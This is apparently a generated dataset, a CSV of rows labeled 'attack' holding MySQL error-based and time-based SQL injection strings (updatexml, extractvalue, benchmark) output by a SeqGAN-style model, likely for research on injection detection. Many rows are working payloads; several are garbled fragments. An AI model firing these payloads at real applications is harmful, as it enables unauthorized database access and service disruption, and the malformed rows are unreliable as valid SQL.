attack,"' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'nnh",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,629
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,630
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,631
attack,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esi",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,632
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,633
attack,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""ocioknc' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'np",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,634
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,635
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%     ppSELECTyFROM",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,636
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,637
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,638
attack,"1"" or extractvalue  (  (  (  (  (  (  (  1297,concat  (  (  (  (  (  (  0x5c,0x7171706a71,  (  5000000(  (  (  (  (  0x5c,  (  (  3393=  (  select   (  (  elt  (  1297  =  (  7982,1   (  case when   (  (  9350  (  el  (  1808  =  (  1808,concat  (  (  (  1808  =  (  0x5c,  (  select   (  1812 0 a  (  elt  (  elt  (  select",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,639
attack,"1%""   )    )    AND AND  =  1 extractvalue  (  (  (  (  (  9255,concat  (  (  (  0(  (  (  benchmark  (  (  0x5c,0x7171706a71,  (  benchmark  (  5000000(  0x2e,0x7171706a71,  (  (  (  benchmark  (  (  benchmark  (  (  (  5000000(  (  (  (  1808,concat  (  (  (  2917  (  =  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  select   (  elt  (  e  3393  =  3335  (  case when   (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,640
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,641
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,642
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,643
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,644
attack,"1%""   )    )    (     extractvalue  (  (  (  9627,concat  (  (  0x5c,(  (  5000000,md3217  (  2917,concat  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  5000000,md5  (  0x4b774c75   (  (  elt  (  7982  (  (  (  0x2e,  (  select   (  elt  (  (  3576  =  3393,md5  0x4b774c75   (  (  elt  (  elt  (  (  1808  =  3393,1   (  extractvalue  (  9788,md",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,645
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  'kbbnanalyse    (  1808,1   )    (  extractvalue  (  9627,md5  (  (  select   (  elt  (  elt5464  =  8375  =  (  (  0x2e,0x7171706a71,  (  5000000(  0x2e,md5  (  =  (  0x5c,0x7171706a71,  (  select   (  1808  )  (  (  3393  =  (  1808,  (  =  (  9788,md5  (  (  6200  )  =  (  3393,concat  (  (  (  (  0x2e,0x7171706a71,  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,646
attack,"1 and extractvalue  (  (  2917,concat  (  (  (  (  t  (  (  3393,mdual  )  0x2e,0x717a767a71  (  select   (  1724  =  (  1   (    (  (  (  9255,md5  (  (  0x5c,  (  (  (  5000000,md5  (  (  (  0x5c,  (  (  benchmark  (  benchmark  (  9255,concat  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  (  select   (  (  elt  (  el  0x4b774c75   )    (  7997  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,647
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,648
attack, p'  =  'ci,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,649
attack,1%1%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,650
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,651
attack," AND or extractvalue  (  (  (  =  (  7982,1   )    (  select   (  case when   (  3863  (  (  9103  =  (  (  1 a  (  elt  (  0x2e,  (  0x2e,0x7171706a71,  (  (  t  (  (  1759  (  2917,concat  (  (  (  0x2e,0x7171706a71,  (  5000000(  select   (  elt  (  3393,1   )    (  extractvalue  (  (  5000000,concat  (  (  (  0x2e,0x7171706a71,  (  (  select   (  (   fromdduan",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,652
attack,"1%'   )    )    AND AND proce l    AND anal  el  =    =  (  5198  =  (  (  0x2e,md5  (  select   (  )  elt  (  elt  (  select 0 0 from d d dual  )  e  )   (  1354  (  (  5777  (  a  )  (  (  (  0x2e,0x7171706a71,0x7171706a71,  (  5000000(  (  0x2e,0x7171706a71,  (  (  select   (  elt   (  5847  (  benchmark  (  5000000(  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,653
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,654
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,655
attack,"1"" and extractvalue  (  (  1808,concat  (  (  (  (  0x2e,0x7171706a71,  (  (  (  (  (  t  (  (  (  (  (  (  benchmark  (  (  =  (  (  9627,concat  (  (  (  0x5c,0x7171706a71,  (  (  (  (  (  5000000,md5  (  (  (  (  0x2e,0x7171706a71,  (  (  (  benchmark  (  l=  (  benchmark  (  (  benchmark  =  (  (  3393,concat  (  3393  (  8862  (  (  0x2e,0x7171706a71,  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,656
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,657
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,658
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,659
attack,"1%%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,660
attack,"1  )  extractvalue  (  (  (  (  (  9627,concat  (  3393,concat  (  0x2e,0x7171706a71,  (  (  benchmark  (  benchmark  (  (  2917,md5  (  3393  (  (  3393,md5  (  0x5c,  (  (  select   (  elt  (  1808  =  (  (  select   (  (  elt  (  3393  =  (  1808,concat  (  0x5c,0x7171706a71,  (  =  (  7982,2446  (  2917,md5  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,661
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,662
attack,"1%""  =  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,663
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,664
attack,"1%""   )    )     (  1  (  (  (  (  1 extractvalue  (  (  (   (  5433  (  (   from(  0x2e,0x7171706a71,  (  (  (  (  extractvalue  (  (  (  (  3393,1   (  from 3576   (  (  elt  (  elt  (  0x5c,0x7171706a71,  (  (  9627,1   (  extractvalue  (  (  (  3393,md5  (  =  (  7982,1,1  )  (  extractvalue  (  9627,concat  (  (  (  (  select   (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,665
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,666
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ' bnhz' like 'n"" like ""--",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,667
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,668
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""'   4066 or extractvalue  (  (  (  0x5c,0x7171706a71,0x7171706a71,  (  (  (  (   (  (  (  (  (  (  select   (  elt  (  3393,1   )    )  (  Ut9490  select   (  6581  (  select   (  el  (  0x2e,0x7171706a71,  (  select   (  elt  (  5000000,md5  (  (  (  0x2e,0x7171706a71,  (  tl_  (  5000000(  (  0x2e,0x7171706a71,  (  extractvalue  (  (  (  (  select   (  elt  (  1808",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,669
attack,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,670
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,671
attack,"1%"" and extractvalue  (  (  (  (  (  =  (  2446  (  6581  =  (  (  (  (  (  1759(  (  3393  )  (  (  9627(  0x4b774c75   (  8375  (  (  (  1297  =  (  (  0x5c,  (  (  =  (  1297,  (  0x52515a50   (  3863  (  case 0 dual  )  el  )  el  )  )   then 1 else cast  (  (  (  0x2e,0x7171706a71,  (  (  (  select   (  elt  (  2917  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,672
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and """"  =  ""%""  =  ""ynses(    (  =  (  3393,1   )    (  select   (  case when   (  5847  (  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,m,  (  benchmark  (  (  select   (  elt  (  elt  (  1049  =  (  0x2e,0x7171706a71,  (  (  select   (  elt  7982  =  (  =  (  (  1297  =  (  =  (  (  e  (  1297  =",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,673
attack,"1%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,674
attack,"1%"" and extractvalue  (  (  (  (   (  3576  =  (  3393,concat  (  (  3393,md5  (  (  3393  =  (  0x2e,0x717a767a71  benchmark  )  select 8375t  (  (  (  (  (  elt  (  0x4b774c75   (  (   (  1354  (  (  7982  =  1808,concat  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  (  2917,1   )    (  extractvalue  (  3393,m(  (  (  =  9788,1   (  )   from",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,675
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,676
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,677
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,678
attack,"1%'   and extractvalue  (  (  (  (  5989  (  (  3393,concat  (  (  0x2e,0x7171706a71,  (  select   (  5433  (  (  7982  =  (  (  0x5c,0x7171706a71,  (  0x52515a50   (  updatexml  (  (  5000000,md5  (  (  (  0x5c,  (  select   (  elt  (  (  1297  =  3393,0x7171706a71,  (  (  =  (  1297,m,  (  (  select   (  elt  (  e(  elt  (  7982  =    (  3393,  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,679
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,680
attack,"  (  (  (  extractvalue  (  (  (  (  (  (  (  t  (      (  8375  (  (  (  (  (  (  3393,concat  (  (  (  (  (  (  (  (  select   (   (    (  5000000(  (  select   (  elt  (  1808  =  (  1808,1   )    (  extractvalue  (  9627,1   (  extractvalue  (  (  =  7636  1759(  (  select   (  case 0 0 from dual  )  )  )   (    (  elt  e  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,681
attack,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""ymhknn"" like ""ggknnam",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,682
attack,1%'  =  '%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,683
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,684
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,685
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,686
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,687
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,688
attack,"1%""   )    )    AND FROM v5406NT  1 else extractvalue  (  (  (  (  (  3393,concat  (  (  (  0x2e,md5  (  (  0x5c,0x7171706a71,1   (  )  case when   (  (  (  7982  =  (  (  1808,1   )    )     )  extractvalue  (  (  1297,concat  (  (  (  0x2e,0x7171706a71,  (  (  (  select   (  elt  (  elt  (  2917  =  (  0x5c,0x7171706a71,  (  select   (  el  (  a  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,689
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,690
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,691
attack,"1%""   )    )    ANDt or extractvalues(  (  (  (  (  (  6166  =  (  (  7982,1   )    (  extractvalue  (  7982,md5  =  (  =  5704t0 0 from(  (  elt 0 a  elt  elt  (  0x5c,0x7171706a71,  (  5000000(  0x2e,0x7171706a71,,md5  (  0x2e,0x7171706a71,  (  (  select   (  5198  =  (  1297,1   (  extractvalue  (  (  9627,concat  (  (  (  0x5c,0x7171706a71,  (  9255,m",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,692
attack,1%'   )    )dprocei,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,693
attack," 1,updatexml  (  (  (  2917,concat  (  3393  (  (  (  (  0x2e,0x7171706a71,  (  select   (  )  elt  (  elt  (  0x5c,0x7171706a71,  (  (  5000000,md5  (  select   (  elt  3393  =  0x5c,  (  9627,md5  (  =  (  e  (  0x4b774c75   )    FROM 0 from dual  )  4688  )  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,694
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%?     and,0x717a767a71  (  USEextractvalueconcat   (  (  elt  (  1808  =  (  5989  (  e  (  1808  =  (  (  (  0x5c,0x7171706a71,  (  (  select   (  (  elt  (  1297  =  (  (  (  5000000,1   (  3539  (  3393,1   )    )    AND d5  (  select   (  case 1 and updatexml  (  (  (  (  (   (  (  1049  =  (  1808,concat  (  (  (  (  0x2e,0x7171706a71,  (  benchmark",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,695
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,696
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,697
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,698
attack,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'zntegzjlmesssm'  =  'elyse  (  (  (  (  select   (  elt  (  1297  =  (  1808,1   (  8375  =  't  (  e  (  benchmark  (  (  (  1297,concat  (  (  3393  (  (  1808,  (  (  =  (  5000000(  3393,1,md5  (  0x5c,md5  (  0x5c,0x7171706a71,  (  9627,md5  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  select   (  case when   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,699
attack,"1%'   )    )     (  (  =  8277 or updatexml  (  (  (  (  (  (  (  (  (  1808=  (  (  (  (  0x2e,md5  (  (  0x5c,  (  (  (  benchmark  (  (  5000000(  (  (  (  0x2e,0x7171706a71,  (  extractvalue  (  (  benchmark  (  (  (  5000000(  (  (  (  (  3393  =  (  (  00x5c,0x7171706a71,  (  select   (  elt  (  elt  (  0x5c,  (  (  benchmark  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,700
attack,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ',(Aupdatexml  (1't5847  =  5  (  (  1297=  1808,1   )    (nt  select   (  )  case when   (  (  (  3393,1   )    ual  )  select from 0 0 from dual  )  e  )  )   (  3335  (  (  elt  (  0x5c,0x7171706a71,  (  5000000(  (  3393  (  (  (  1808  =  1   from d5  (  elt  (  )  7982  =  (  (  (  select   (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,701
attack,"1% and else""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""ieilrenal  el  (  1808  (  benchmark  (  (  1808  =  (  =  (  (  0x2e,0x7171706a71,1   )    (  select   (  case when   (  extractvalue  (  2917,concat  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  t  (  (  5000000(  (  0x5c,0x7171706a71,  (  select   (  ua  elt  (  1808  0x7171706a71  =  (  (  (  select   (  elt  (  elt  (  0x2e,md5  (  0x2e,0x7171706a71,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,702
attack,"1%'  =  ' bo""  =  ""lease  (  6166  (  0x2e,  (  =  (  9255,concat  (  9788,  (  select   (  =  eltal  )  0x2e,0x7171706a71,  (  benchmark  (  (  9627,concat  (  (  (  0x2e,md5  (  select   (   (  5847  (  7982,1   )    AND 'i'  =  4968 when   (  (  (  elt  (  2917  =  (  6166  (  0x2e,0x7171706a71,  (  benchmarkt(  elt  (  elt  (  0x2e,0x7171706a71,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,703
attack,"1%""   )    1559   (  extractvalue  (  (  (  3393,concat  (  (  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  select   (  ut  elt  (  '  (  0x4b774c75   (  ual  )   end  (  )   (  (  elanal  )  5000000,md5  (  1808  (  (  0x2e,md5  (  (  (  1808,1   from d5  (  e  (  elt  1808  =  (  (  select   (  elt  (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,704
attack,"1%""   )    )    AND 'i'  =  2162  =  1559  )  select   (  case 5423 0 from   (  el  (  elt  (  1049  =  (  2917,1   (  extractvalue  (  (  1297,m  (  (  (  0x4b774c75   )    (  (  8862,md5  (  8862t  (  (  (  (  (  0x2e,md5  (  (  1297  =  (  7982,1   (  updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  =  a  (   from(  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,705
